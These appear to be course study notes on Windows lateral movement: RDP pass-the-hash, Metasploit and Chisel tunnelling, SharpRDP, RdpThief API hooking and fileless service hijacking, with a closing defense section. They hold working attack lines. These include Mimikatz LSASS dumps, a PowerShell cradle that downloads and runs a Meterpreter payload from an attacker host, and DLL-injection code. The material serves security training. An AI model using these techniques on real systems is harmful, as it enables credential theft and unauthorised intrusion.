PEN-300 Module 17 — Windows Lateral Movement (RDP abuse, PsExec theory, fileless SCM)

Fuente: material del curso correspondiente (sin video público)

Distilled from OffSec PEN-300 (OSEP) course material (module: Windows Lateral Movement) — internal training reference, not for redistribution.

Objective

Initial access is only step one — the post-exploitation goal is to compromise more of the org's assets (more privileged access, or access to confidential data), dictated by the test's goals. This module covers Windows lateral-movement techniques that do not rely on software vulnerabilities: they reuse stolen credentials (NTLM hashes or Kerberos tickets) and mostly require local administrator access on the target. The known non-vuln technique families are PsExec, WMI, DCOM, and PSRemoting — some need clear-text credentials, others only a hash. Module path: RDP abuse (standard, pass-the-hash, reverse proxying, command-execution, credential theft) → PsExec theory → a stealthier fileless variant. Techniques apply equally to workstations and servers, and each offers some element of stealth.

Target surface

  • Lab domain: corp1, with domain controller dc01, Windows 10 client (attacked via RDP as dave), and server appsrv01 (destination of lateral movement).
  • Attacker hosts: Kali (192.168.119.120-style addressing in listings) and the Windows 10 client as a pivot/launch point.
  • Key lab facts: Mimikatz available at C:\Tools\mimikatz.exe; SharpRDP pre-compiled in C:\Tools; the RdpThief DLL is pre-compiled on appsrv01 at C:\Tools\RdpThief.dll; the module's reverse-proxy lab deliberately has no NAT/firewall — reverse tunneling is used to practice the concept.
  • Credentials referenced in listings are generic lab values (e.g. corp1\dave / corp1\admin with a trivial lab password) — treated as [REDACTED]; the NTLM hash for dave shown in output is a lab artifact, not a real credential.

Techniques

1. Lateral movement with RDP (interactive logins)

RDP is a multichannel Microsoft protocol for Terminal Server ↔ client communication, and since it's how admins normally work, RDP traffic blends in with normal network usage — a stealth advantage. If we hold clear-text credentials for a domain user who is a local admin on the target, we simply connect with mstsc.exe (demo: from the Windows 10 client, mstsc to appsrv01 as dave).

Mechanics worth remembering:

  • RDP requires clear-text credentials (interactive logons can't be done with a hash).
  • An RDP connection disconnects any existing session; the /admin flag connects to the admin session and doesn't disconnect the current user when you log in as the same user.
  • During the session, NTLM hashes reside in LSASS memory for its duration; a disconnect (vs. proper logout) leaves them there — compromising a well-used jump server yields every cached credential.

The lab demo dumps them with Mimikatz from an elevated console:

mimikatz # privilege::debug
mimikatz # !+                                  # load mimidrv driver
mimikatz # !processprotect /process:lsass.exe /remove   # strip LSA protection
mimikatz # sekurlsa::logonpasswords
# → Session: RemoteInteractive, User: dave, Domain: corp1, NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e

2. Restricted admin mode & RDP pass-the-hash

Restricted admin mode (Microsoft's mitigation for exactly the above) makes RDP perform a network login: no clear-text credentials required, none stored in memory — at the cost of disabling single sign-on. It's off by default, controlled by DisableRestrictedAdmin under HKLM:\System\CurrentControlSet\Control\Lsa.

Two-way payoff for attackers:

  1. Defensive side: with /restrictedadmin, mstsc authenticates with the current logon session (no password typed), and Mimikatz on the target then finds no NTLM hash in LSASS — nothing cached.
  2. Offensive side: a network login means the session can be authenticated with only an NTLM hash. Mimikatz launches mstsc /restrictedadmin in another user's context:
mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"

The resulting mstsc window connects straight into appsrv01 as admin — RDP lateral movement with a hash only. (Cosmetic quirk: the dialog still labels the connection as dave — an artifact of the pass-the-hash.)

If restricted admin mode is disabled on the target: enable it remotely first. Pass the hash into a PowerShell process (sekurlsa::pth /run:powershell), then Enter-PSSession -Computer appsrv01 and create the value:

New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0

The setting applies instantly and the RDP pass-the-hash works again. To disable it (as the lab does for the demo): Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin, which makes subsequent connections fail until re-enabled.

From Kali directly, xfreerdp supports restricted-admin pass-the-hash (target port 3389 must be reachable):

xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore

3. Reverse RDP proxying with Metasploit (reaching NAT'd hosts)

GUI access to a compromised machine simplifies post-exploitation, but edge firewalls/NAT block inbound RDP to internal hosts. Fix: egress tunnel. From a Meterpreter session on the internal client:

  1. multi/manage/autoroute with set session 1 → adds a route to the internal subnet through the session ([+] Route added to subnet 192.168.120.0/255.255.255.0 from host's routing table.).
  2. auxiliary/server/socks4a with set srvhost 127.0.0.1, run as a background job → SOCKS proxy riding the tunnel.
  3. Point proxychains at it — echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf — then:
proxychains rdesktop 192.168.120.10

The RDP session flows out of the compromised host into the internal net. The same route serves any other tool: Nmap for internal scans, Firefox for internal web apps. (Lab note: with no firewall/NAT present, the tunnel isn't strictly required — it's practice for the real-world case.)

4. Reverse RDP proxying with Chisel (standalone)

Frameworks like Metasploit/Cobalt Strike have autorouting built in; with Empire or Covenant you need a standalone tool. Traditional choice: plink (command-line PuTTY). Modern choice: Chisel — Golang TCP tunnel over HTTP secured with SSH, with client and server components creating a SOCKS-compliant proxy.

Build (on Kali):

sudo apt install golang
git clone https://github.com/jpillora/chisel.git && cd chisel
go build                                            # Linux server binary
env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"   # Windows client, symbols stripped

Run — server on Kali, client on the compromised Windows host (transferred via the existing shell):

./chisel server -p 8080 --socks5                    # SOCKS5 server enabled, listening :8080

C:\Tools> chisel.exe client 192.168.119.120:8080 socks   # → proxy listening on 127.0.0.1:1080

Then tunnel RDP the same way: sudo proxychains rdesktop 192.168.120.10. More work than a built-in feature, but gives GUI access where none should be possible. Chisel also supports classic reverse-SSH-tunnel syntax via -reverse on the server side. (0xdf variant noted in the course.)

5. RDP as a console — SharpRDP (no GUI, no tunnel)

mstsc.exe is a GUI wrapper over the terminal services library mstscax.dll, which exposes COM interfaces to scripts and compiled code. SharpRDP (C#, MDSec) uses the non-scriptable interfaces to authenticate exactly like mstsc, then executes commands through SendKeys — so no GUI access and no reverse tunnel needed:

C:\Tools> SharpRDP.exe computername=appsrv01 command=notepad username=corp1\dave password=[REDACTED]
[+] Connected to: appsrv01
[+] User not currently logged in, creating new session
[+] Execution priv type: non-elevated
[+] Executing notepad

Real payload: a PowerShell download cradle that pulls and runs a Meterpreter executable:

C:\Tools> sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=[REDACTED]

→ reverse Meterpreter session on Kali (handler on 443). Command-line lateral movement over RDP with neither GUI nor tunneling. Note execution is non-elevated.

6. Stealing clear-text credentials from RDP (API hooking with RdpThief)

A generic keylogger captures RDP credentials but drowns you in output; a targeted hook is cleaner. Concept: API hooking — overwrite a function's first instructions with a jump to custom code that (a) copies the input buffer contents back to us, or (b) rewrites them, then continues execution unaltered. (Microsoft's Detours library does this; the course's earlier Frida module was a related monitoring technique.)

MDSec research identified the APIs handling RDP username, password, and domain: CredIsMarshaledCredentialW, CryptProtectMemory, and SspiPrepareForCredRead. RdpThief hooks these with Detours, copies the values to a file, and lets the original API proceed. It's an unmanaged DLL that must be injected into mstsc.exe before the user types credentials — the course reuses its C# DLL-injection tradecraft (OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread on LoadLibraryA), changing only the target process and DLL:

String dllName = "C:\\Tools\\RdpThief.dll";
Process[] mstscProc = Process.GetProcessesByName("mstsc");
int pid = mstscProc[0].Id;
IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
// ... VirtualAllocEx, WriteProcessMemory(dll path), CreateRemoteThread(LoadLibraryA)

Then: start mstsc.exe, run Inject.exe, let the user log in (demo: mstsc → dc01 as admin), read the drop file:

C:\Tools> type C:\Users\dave\AppData\Local\Temp\6\data.bin
S e r v e r :   d c 0 1   U s e r n a m e :   c o r p 1 \ a d m i n   P a s s w o r d :   l a b

(output path's username is resolved dynamically; trailing numbered dir is the session ID — lab password value shown only as output shape, [REDACTED]).

Timing problem solved with a one-second polling loop: while(true) over Process.GetProcessesByName("mstsc"), injecting into every new instance, Thread.Sleep(1000) between iterations — so the DLL is always in place before credentials are typed.

7. PsExec theory (what we're evading)

PsExec (Sysinternals): authenticates to SMB on the target, accesses the DCE/RPC interface, reaches the service control manager, creates a new service, and executes it — copying the service binary to the target as part of the attack. Every one of those artifacts (written file, new service) is a detection opportunity, which motivates the fileless variant below.

8. Fileless lateral movement — the SCShell technique

Goal: a PsExec variant that neither writes a file to disk nor creates a new service. Two tasks: authenticate to the target, then execute code.

  • Authentication is handled by the unmanaged OpenSCManagerW API (machine name, database name — null for default — and desired access; SC_MANAGER_ALL_ACCESS = 0xF003F). It executes in the context of the calling thread's access token — no password needed, and consequently pass-the-hash works trivially (launch the tool via sekurlsa::pth).
  • Execution avoids CreateServiceA entirely: OpenServiceW opens an existing service (candidate: SensorService — present by default on Windows 10 and Server 2016/2019, not vital, not auto-start; SERVICE_ALL_ACCESS = 0xF01FF), then ChangeServiceConfigA re-points the service binary at our payload (only relevant args: dwServiceType = SERVICE_NO_CHANGE (0xffffffff), dwStartType = SERVICE_DEMAND_START (0x3), dwErrorControl = 0, lpBinaryPathName = payload; rest null), then StartServiceA(hService, 0, null) fires it.

PoC sets the binary to notepad.exe; executed as dave, Notepad appears on appsrv01 running as SYSTEM (the SCM kills it shortly after since it's not a real service executable — code execution achieved regardless). Because we control the binary path, we can point it at a PowerShell download cradle so nothing touches disk; with application whitelisting in place this needs a bypass (InstallUtil, XSL transform, etc.).

SCShell (C#, C, and Python implementations) weaponizes this: it also queries the original binary path via QueryServiceConfig and restores the service binary afterward, further aiding evasion. Kali-side use with only an NTLM hash:

python3 scshell.py -hashes :<ntlm> <domain>/<user>@appsrv01   # shape per tool docs

Key P/Invoke signatures (all advapi32.dll):

[DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, CharSet=CharSet.Unicode, SetLastError=true)]
public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

[DllImport("advapi32.dll", EntryPoint="ChangeServiceConfig")]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

[DllImport("advapi32", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

Detection & defense

  • RDP lateral movement is high-value precisely because it blends in — detection hinges on context, not the traffic itself: correlate RDP logons (especially RemoteInteractive session types) with which accounts legitimately RDP where; alert on unusual source→target pairs and off-hours interactive logons.
  • Credential caching is the root exposure of section 1: restricted admin mode (network logon, nothing cached) plus credential-guard-style LSA protection directly shrink the dumpable surface — Mimikatz had to strip lsass.exe process protection before sekurlsa::logonpasswords worked.
  • Restricted admin mode trade-off: it stops hash theft on the target but creates an RDP pass-the-hash path — defenders must weigh enabling it; if enabled, watch for DisableRestrictedAdmin registry modifications (both value creation and deletion), which is exactly the attacker's enable/disable cycle.
  • Reverse tunnels: autoroute/SOCKS and Chisel ride outbound egress (HTTP/WebSocket on 8080) — egress filtering, blocking workstation→workstation 3389, and alerting on SSH/HTTP-tunnel patterns matter more than inbound blocking. NLA/credentials failing through a SOCKS chain ("Failed to initialize NLA…") is a hint of proxied RDP in logs.
  • SharpRDP authenticates like real mstsc but drives the session with SendKeys — no tunnel, no GUI; detection is on the logon + immediate suspicious process spawning (download cradles) under RDP sessions, and on non-elevated process trees.
  • RdpThief / API hooking: an unmanaged DLL injected into mstsc.exe via remote-thread + LoadLibraryA — classic injection telemetry (cross-process OpenProcess with 0x001F0FFF, CreateRemoteThread), plus the data.bin drop in the user's temp dir. Hook-based tools overwrite API prologues; integrity monitoring of mstscax.dll-adjacent API usage is hard at the host level, so the injection chain is the practical alert.
  • Fileless SCM abuse (SCShell): no new service is created and no file lands on disk, but ChangeServiceConfigA against an existing service (e.g. SensorService) modifies service configuration — monitor Event ID 7040 / service-configuration changes and restore operations; SCShell's own restoration step is itself a change-event sequence (modify → start → restore) that stands out. Remote SCM access from workstations is abnormal; restrict which accounts can remotely reconfigure services.
  • Cross-cutting: nearly every technique here runs with local admin rights and reuses NTLM — the systemic mitigations are limiting local-admin membership across hosts (no credential reuse ladder), NTLM reduction/Kerberos-only auth, and LSASS protection, which together collapse most of this module's attack surface.
